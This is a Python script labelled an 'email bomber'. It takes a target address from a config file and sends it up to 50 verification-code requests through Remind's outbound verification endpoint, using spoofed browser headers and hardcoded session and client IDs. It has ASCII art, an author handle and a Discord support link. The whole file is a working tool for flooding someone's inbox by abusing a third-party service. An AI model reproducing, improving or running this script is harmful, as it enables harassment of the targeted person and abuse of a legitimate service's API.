import requests
import pystyle
from pystyle import Write, Colors
import os
import raducord
from raducord import Logger, Console
import time
import json
import random
from random import choice
import tls_client
from tls_client import Session
import colorama
from colorama import Fore

#Don't skid 🙏🙏🙏



Console.init()

with open('config.json', 'r') as f:
    data = json.load(f)



headers = {
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Content-Type': 'application/json; charset=UTF-8',
    'Origin': 'https://www.remind.com',
    'Referer': 'https://www.remind.com/',
    'Sec-Fetch-Mode': 'cors',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'X-Client-Id': '3419e587-c868-4d26-a1ed-c0466a93a73d',
    'X-Requested-With': 'XMLHttpRequest',
    'X-Session-Id': 'bd761585-d349-4e31-af20-345049af4f79'
}







def email_bomber():
    art = f"""           ____                      ,
          /---.'.__             ____//
               '--.\           /.---'
          _______  \\         //
        /.------.\  \|      .'/  ______
       //  ___  \ \ ||/|\  //  _/_----.\__
      |/  /.-.\  \ \:|< >|// _/.'..\   '--'
         //   \'. | \'.|.'/ /_/ /  \\
        //     \ \_\/" ' ~\-'.-'    \\
       //       '-._| :H: |'-.__     \\
Cst   //           (/'==='\)'-._\     ||
      ||                        \\    \|
      ||                         \\    '
       |/                         \\
                                   ||
                                   ||
                                   \\
                                    '
            [?]Made By cst__22
            [Support] .gg/mhNDrmn7hA
            [+]Email To Spam: {data['config']}
"""
    Write.Print(art, Colors.blue_to_red, interval=0.001)
    #cuantity of mails
    counts = int(Write.Input('(max 50)Number of emails: ', Colors.black_to_white))
    if counts >= 50:
        Logger.warning('Invalid,Invlid count,-')
        time.sleep(2)
        exit()
    
    api = 'https://www.remind.com/v2/devices/outbound_verification/code'
    payload = {
        'address': data['config']
    }
    for i in range(counts):
        #Send the requests to the mail verification
        r = requests.post(api, json=payload, headers=headers)
        #response code
        if r.status_code == 201:
            Logger.success('Sucess, Email Sended,-.-')
        else:
            print(r.json())
            Logger.failed('Failed, Failed email sending,-.-')


        time.sleep(1)
if __name__ == '__main__':
    email_bomber()